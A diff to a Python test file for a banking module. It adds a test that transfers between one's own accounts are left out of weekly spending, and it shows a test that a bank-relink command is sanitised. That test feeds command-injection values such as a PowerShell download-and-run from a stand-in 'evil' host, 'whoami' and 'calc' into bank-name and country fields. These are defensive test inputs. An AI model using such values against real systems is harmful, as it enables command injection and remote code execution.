@@ -196,6 +196,16 @@ class ViewTest(FetchTest):
         v = banking.view()
         self.assertEqual((v["total"], v["week_spent"]), (100.0, 12.5))
 
+    def test_virement_entre_ses_comptes_non_compte(self):
+        banking.fetch()
+        today = date.today().isoformat()
+        banking._save(banking.CACHE, {"fetched_at": "2026-10-09T10:00:00+00:00", "accounts": [
+            {"bank": "B", "name": "n", "currency": "EUR", "balance": 1.0, "transactions": [
+                {"date": today, "amount": -200.0, "label": "virement"}, {"date": today, "amount": -5.0, "label": "café"}]},
+            {"bank": "C", "name": "n", "currency": "EUR", "balance": 1.0, "transactions": [
+                {"date": today, "amount": 200.0, "label": "virement reçu"}]}]})
+        self.assertEqual(banking.view()["week_spent"], 5.0)
+
     def test_commande_de_renouvellement_filtree(self):
         self.assertEqual(banking.renew_cmd("Trade Republic", "DE"), 'python -m jarvis bank link "Trade Republic" DE')
         for bank, country in (('X$(iwr evil|iex)', "FR"), ("X`whoami`", "FR"), ('X" ; calc', "FR"), ("Banque", "fr;x")):
